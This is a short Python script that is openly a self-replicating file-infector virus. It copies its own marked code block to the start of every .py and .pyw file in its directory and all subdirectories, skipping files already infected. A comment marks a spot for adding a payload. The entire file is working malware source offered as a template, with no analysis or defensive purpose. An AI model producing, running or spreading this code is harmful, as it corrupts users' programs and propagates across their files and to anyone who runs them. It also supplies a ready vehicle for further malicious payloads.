### START ###
import sys
import glob
import os

code_to_infect = []
with open(sys.argv[0], 'rb') as this_file:
    virus_code = this_file.readlines()

virus_part = False
for line in virus_code:
    if line == b'### START ###\r\n':
        virus_part = True
    if virus_part:
        code_to_infect.append(line)
    if line == b'### END ###\r\n':
        break

file_directory = os.path.realpath(__file__)
file_directory = file_directory.split('\\')
file_directory.pop()
this_directory = ""
for path in file_directory:
    this_directory += path + "\\"
this_directory = this_directory[:-1]

full_dir_sub_folders = os.walk(this_directory)
full_dir_sub_folders = list(full_dir_sub_folders)

short_dir_path = []
for dir_num in range(0, len(full_dir_sub_folders)):
    short_dir_path.append(full_dir_sub_folders[dir_num][0][len(this_directory) + 1:])

files = []
files += glob.glob('*.py') + glob.glob('*.pyw')
for folder in short_dir_path:
    files += glob.glob(f'{folder}/*.py') + glob.glob(f'{folder}/*.pyw')

for file in files:
    with open(file, 'rb') as target_file:
        target_code = target_file.readlines()
    if b'### START ###\r\n' in target_code:
        continue
    code = []
    code += code_to_infect
    code += list(target_code)
    with open(file, 'wb') as infect:
        infect.writelines(code)

# ENTER VIRUS CODE HERE!!!#

### END ###
